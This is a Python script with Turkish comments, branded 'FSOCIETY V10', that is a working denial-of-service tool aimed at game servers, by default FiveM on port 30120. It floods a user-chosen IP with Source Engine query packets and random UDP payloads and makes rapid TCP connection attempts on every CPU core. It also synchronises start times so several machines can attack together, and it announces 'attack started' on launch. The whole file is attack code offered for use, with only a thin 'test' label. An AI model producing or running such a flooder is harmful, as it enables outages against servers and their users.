import socket
import multiprocessing
import random
import time
import sys
from datetime import datetime
import requests

# --- PROTOKOL PAKETLERİ ---
# Sunucuyu cevap vermeye zorlayan ve CPU tüketen Steam/FiveM paketleri
A2S_INFO = b'\xff\xff\xff\xffTSource Engine Query\x00'
A2S_PLAYER = b'\xff\xff\xff\xffU\xff\xff\xff\xff'

def get_network_time():
    """İki bilgisayarın saniyesinin tam tutması için internetten zamanı çeker"""
    try:
        response = requests.get("http://worldtimeapi.org/api/timezone/Etc/UTC", timeout=5)
        return datetime.fromisoformat(response.json()['datetime'].replace('Z', '+00:00'))
    except:
        return datetime.utcnow()

def udp_engine(ip, port, end_time):
    """UDP Flood: Oyun portuna (30120) yüklenir ve hattı doldurur"""
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
    target = (ip, port)
    
    while time.time() < end_time:
        try:
            # Protokol sorgularını ve ağır veriyi karıştır
            client.sendto(A2S_INFO, target)
            client.sendto(A2S_PLAYER, target)
            if random.random() > 0.6:
                client.sendto(random._urandom(1300), target)
        except:
            continue

def tcp_syn_engine(ip, port, end_time):
    """TCP SYN: Sunucunun bağlantı tablosunu (RAM/Kernel) kilitlemeye çalışır"""
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            # Tam bağlantı kurmadan bırakarak sunucuyu 'Half-Open' modunda bekletir
            s.connect_ex((ip, port))
            s.close()
        except:
            continue

def start_multi_pc_test():
    print(f"\n{'='*40}")
    print("      FSOCIETY V10: SYNAPSE EDITION")
    print(f"{'='*40}")
    
    ip = input("[?] Hedef IP: ")
    port = int(input("[?] Hedef Port (FiveM: 30120): "))
    method = input("[?] Metod (UDP / TCP / HYBRID): ").upper()
    duration = int(input("[?] Süre (Saniye): "))
    start_at = input("[?] Başlama Saati (SS:DD:SN formatında, örn 20:30:00): ")

    # Senkronizasyon Ayarı
    now = datetime.now()
    target_start = datetime.strptime(start_at, "%H:%M:%S").replace(
        year=now.year, month=now.month, day=now.day
    )
    
    wait_sec = (target_start - datetime.now()).total_seconds()
    
    if wait_sec > 0:
        print(f"\n[*] Sistem Beklemede... {wait_sec:.1f} saniye sonra saldırı başlayacak.")
        print("[*] Diğer bilgisayarı da aynı saate kurduğundan emin ol!")
        time.sleep(wait_sec)
    
    end_time = time.time() + duration
    cores = multiprocessing.cpu_count()
    
    print(f"\n[!] SALDIRI BAŞLATILDI: {ip}:{port}")
    print(f"[*] {cores} çekirdek kullanılıyor...")

    processes = []
    for i in range(cores):
        if method == "HYBRID":
            func = udp_engine if i % 2 == 0 else tcp_syn_engine
        elif method == "TCP":
            func = tcp_syn_engine
        else:
            func = udp_engine
            
        p = multiprocessing.Process(target=func, args=(ip, port, end_time))
        p.daemon = True
        p.start()
        processes.append(p)

    for p in processes:
        p.join()
    
    print("\n[+] Test tamamlandı. Hedef durumu kontrol ediliyor.")

if __name__ == "__main__":
    multiprocessing.freeze_support()
    start_multi_pc_test()